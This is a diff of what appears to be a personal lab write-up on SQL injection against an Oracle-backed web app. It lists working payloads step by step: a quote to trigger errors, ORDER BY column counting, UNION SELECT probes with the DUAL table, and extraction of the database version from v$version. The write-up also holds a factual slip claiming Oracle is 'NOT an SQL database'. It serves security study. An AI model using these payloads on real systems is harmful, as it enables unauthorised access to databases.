@@ -8,6 +8,24 @@ Analysis:
 (1) Verify the vulnerability by adding a ' comment character which should cause an Internal Server Error
 
 (2) Determine the number of columns using {' order by x--}
-{' order by 1--} 200 STATUS OK
-{' order by 2--} 200 STATUS OK
-{' order by 3--} Internal server error
+    {' order by 1--} 200 OK
+    {' order by 2--} 200 OK
+    {' order by 3--} Internal server error
+
+(3) Detemine the data type of the columns 
+    
+    (a) using {' UNION SELECT 'a', 'a'--} Internal Server Error 
+    => meaning it is NOT an SQL database and most likely an oracle database
+    
+    (b) adding a DUAL table that is a speical table provided by Oracle accessible to all users {' UNION SELECT 'a', 'a' FROM DUAL--} 200 OK
+
+(4) Output the version of the database using database version command provided in the SQL Injection cheatsheet 
+    
+    using {' UNION SELECT banner, NULL from v$version--} 200 OK
+
+** BONUS exercise **
+(5) Write a python script to automate the checking of oracle Database version for a given URL provided
+
+
+
+
